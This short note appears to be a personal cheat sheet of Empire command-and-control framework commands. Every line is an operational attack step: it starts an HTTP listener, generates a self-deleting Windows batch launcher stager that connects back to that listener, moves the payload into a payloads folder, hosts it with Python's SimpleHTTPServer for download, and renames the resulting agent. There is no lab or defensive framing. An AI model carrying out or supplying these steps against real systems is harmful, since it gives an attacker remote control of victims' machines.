Choses:

​	Without encoding

​	With simple self deleting bat execution(persistence is necessary)

​	Without obvuscation



Setup http listener

```(Empire) > listeners```

```(Empire) > uselistener http```

```(Empire) > info```

(Empire) > set Name Win10

set Port 8001

(Empire) > execute



Check if active

(Empire) > back

(Empire) > list



Setup stager

usestager windows/launcher_bat

info

set Listener Win10

execute



Go to dir

cd /tmp/launcher.bat



Move

mv /tmp/launcher.bat /root/Desktop/payloads



Setup SimpleHTTPServer 

python -m SimpleHTTPServer 8000



rename <Name> WIN10RDW

info

